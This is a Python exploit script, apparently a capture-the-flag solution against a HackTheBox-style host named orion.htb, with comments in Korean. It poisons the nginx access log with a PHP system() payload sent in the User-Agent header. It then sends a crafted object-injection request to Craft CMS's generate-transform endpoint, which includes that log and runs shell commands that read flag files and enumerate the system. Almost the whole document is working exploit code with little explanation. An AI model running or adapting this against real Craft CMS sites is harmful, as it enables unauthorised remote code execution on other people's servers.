#!/usr/bin/env python3
"""최종 flag 추출"""
import socket, sys, re, json, time
import requests, urllib3

urllib3.disable_warnings()
TARGET_IP = "10.129.244.146"
_orig = socket.getaddrinfo
def p(h, *a, **kw):
    return _orig(TARGET_IP if h == "orion.htb" else h, *a, **kw)
socket.getaddrinfo = p

TARGET = "http://orion.htb"
s = requests.Session()
s.verify = False

def get_rce_output(cmd, marker_s="===S===", marker_e="===E==="):
    """RCE 실행 및 output 추출"""
    csrf_r = s.get(f"{TARGET}/actions/users/session-info", headers={"Accept": "application/json"})
    csrf = csrf_r.json()["csrfTokenValue"]

    # PHP with markers
    php_payload = f"<?php echo '{marker_s}'; system('{cmd}'); echo '{marker_e}'; ?>"
    print(f"[*] UA length: {len(php_payload)}, payload: {php_payload[:60]}...", file=sys.stderr)
    s.get(f"{TARGET}/", headers={"User-Agent": php_payload})
    time.sleep(0.3)

    payload = {
        "assetId": 2,
        "handle": {"width": 1, "height": 1,
            "as hack": {
                "class": "craft\\behaviors\\FieldLayoutBehavior",
                "__class": "yii\\rbac\\PhpManager",
                "__construct()": [{"itemFile": "/var/log/nginx/access.log"}],
            },
        },
    }
    r = s.post(f"{TARGET}/actions/assets/generate-transform",
               data=json.dumps(payload),
               headers={"Content-Type": "application/json", "X-CSRF-Token": csrf})

    print(f"[*] Response: {r.status_code}, len={len(r.text)}", file=sys.stderr)

    # 마커로 감싼 출력 추출
    m = re.search(re.escape(marker_s) + r"(.*?)" + re.escape(marker_e), r.text, re.DOTALL)
    if m:
        return m.group(1).strip()

    # 마커가 없으면 마지막 1000 bytes에서 추출 (log의 마지막 행)
    tail = r.text[-1000:]
    # 마지막 quote 이후의 내용 (User-Agent 필드)
    m2 = re.search(r'"([^"]*?)"\s*$', tail)
    if m2:
        return m2.group(1)

    return None

# FLAGS
print("\n========== USER FLAG ==========")
out = get_rce_output("cat /var/www/FLAG.txt")
if out:
    print(out)
else:
    print("[!] No output captured")

print("\n========== Alternative locations ==========")
for path in ["/root/root.txt", "/home/*/user.txt", "/tmp/*flag*"]:
    out = get_rce_output(f"find / -path '{path}' -type f 2>/dev/null | head -1")
    if out and out != "":
        print(f"{path}: {out}")

print("\n========== Info ==========")
out = get_rce_output("whoami")
print(f"User: {out if out else '?'}")

out = get_rce_output("pwd")
print(f"PWD: {out if out else '?'}")

out = get_rce_output("ls -la /home")
print(f"Homes:\n{out if out else '?'}")
